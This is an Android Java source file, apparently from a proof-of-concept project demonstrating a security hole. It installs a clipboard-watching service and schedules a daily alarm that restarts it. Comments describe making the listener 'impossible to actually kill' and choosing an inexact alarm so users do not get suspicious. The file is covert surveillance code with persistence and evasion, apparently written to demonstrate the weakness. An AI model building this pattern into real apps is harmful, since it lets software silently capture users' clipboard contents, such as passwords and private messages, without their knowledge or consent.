package com.grepx.androidsecurityhole;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;

import static android.app.AlarmManager.INTERVAL_DAY;
import static android.app.AlarmManager.INTERVAL_FIFTEEN_MINUTES;
import static android.app.AlarmManager.INTERVAL_HOUR;

public class ServiceInstaller {
    /**
     * Starts the Clipboard Listener Service and also schedule an alarm that makes it impossible
     * to actually kill the Clipboard Listener.
     */
    public static void installServices(Context context) {
        // start the clipboard watching service
        Intent clipboardIntent = new Intent(context, ClipboardWatcherService.class);
        context.startService(clipboardIntent);

        // schedule an alarm that fires every day, which will make sure the service is still running
        // make it inexact to conserve battery - we wouldn't want them getting suspicious
        AlarmManager alarmMgr = (AlarmManager)context.getSystemService(Context.ALARM_SERVICE);
        Intent intent = new Intent(context, AlarmReceiver.class);
        PendingIntent alarmIntent = PendingIntent.getBroadcast(context, 0, intent, 0);
        alarmMgr.setInexactRepeating(
                AlarmManager.RTC_WAKEUP, System.currentTimeMillis(),
                INTERVAL_DAY, alarmIntent);
    }
}
